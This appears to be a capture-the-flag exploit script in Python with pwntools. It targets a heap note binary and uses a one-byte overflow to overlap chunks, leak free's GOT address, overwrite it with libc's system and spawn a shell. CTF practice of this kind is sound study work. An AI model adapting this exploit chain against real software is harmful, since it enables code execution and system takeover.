from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./npu")
#p=remote("node5.buuoj.cn",27386)
elf=ELF("npu")

def debug():
	gdb.attach(p)
	pause()

def create(size,content):
	p.recvuntil(b"choice :")
	p.sendline(b"1")
	p.recvuntil(b") :")
	p.sendline(str(size))
	p.recvuntil(b"Content:")
	p.sendline(content)

def edit(index,content):
	p.recvuntil(b"choice :")
	p.sendline(b"2")
	p.recvuntil(b"Index :")
	p.sendline(str(index))
	p.recvuntil(b"Content: ")
	p.sendline(content)

def show(index):
	p.recvuntil(b"choice :")
	p.sendline(b"3")
	p.recvuntil(b"Index :")
	p.sendline(str(index))

def delete(index):
	p.recvuntil(b"choice :")
	p.sendline(b"4")
	p.recvuntil(b"Index :")
	p.sendline(str(index))

free_got=elf.got["free"]
print("free_got :",hex(free_got))
create(24,b"aaaa") #chunk0
create(24,b"bbbb") #chunk1
create(24,b"cccc") #chunk2
create(24,b"dddd") #chunk3
edit(1,b"b"*0x18+p8(0x41))
delete(2)
create(56,p64(0)*3+p64(0x21)+p64(0x8)+p64(free_got)) #chunk4
edit(1,b"b"*0x18+p8(0x21))
#edit(1,b"b"*0x30+p64(0x0)+p8(0x21))
#delete(4)
show(2)
free_addr=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
print("free_addr :",hex(free_addr))
libc=ELF("libc-2.27.so")
libc_base=free_addr-libc.sym["free"]
sys_addr=libc_base+libc.sym["system"]
binsh_addr=libc_base+next(libc.search(b"/bin/sh\x00"))
print("sys_addr :",hex(sys_addr))
#edit(2,p64(sys_addr))
edit(0,b"a"*0x18+p8(0x41))
delete(1)
create(56,p64(0)*3+p64(0x21)+p64(0x8)+p64(binsh_addr))
edit(0,b"a"*0x18+p8(0x21))
edit(2,p64(sys_addr))
delete(1)
p.interactive()
#debug()
